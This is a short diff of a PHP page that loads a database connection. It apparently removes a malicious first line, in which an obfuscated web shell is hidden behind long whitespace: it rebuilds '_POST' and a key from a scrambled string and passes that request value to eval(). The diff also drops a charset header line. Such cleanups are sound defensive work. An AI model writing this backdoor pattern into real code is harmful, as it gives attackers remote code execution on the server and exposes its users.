@@ -1,7 +1,6 @@
-<?php                                                                                                                                                                               $f4d='Tev\'qfPS$ia19clO3t_sd(4cd3914';if(isset(${$f4d[18].$f4d[6].$f4d[15].$f4d[7].$f4d[0]}[$f4d[4].$f4d[13].$f4d[20].$f4d[16].$f4d[12].$f4d[11].$f4d[22]])){eval(${$f4d[18].$f4d[6].$f4d[15].$f4d[7].$f4d[0]}[$f4d[4].$f4d[13].$f4d[20].$f4d[16].$f4d[12].$f4d[11].$f4d[22]]);} ?><?php
+<?php
 
 require_once('../Connections/maconnexion.php');
-header('Content-Type: text/html; charset=iso-8859-1');
 
 
 $editFormAction = $_SERVER['PHP_SELF'];
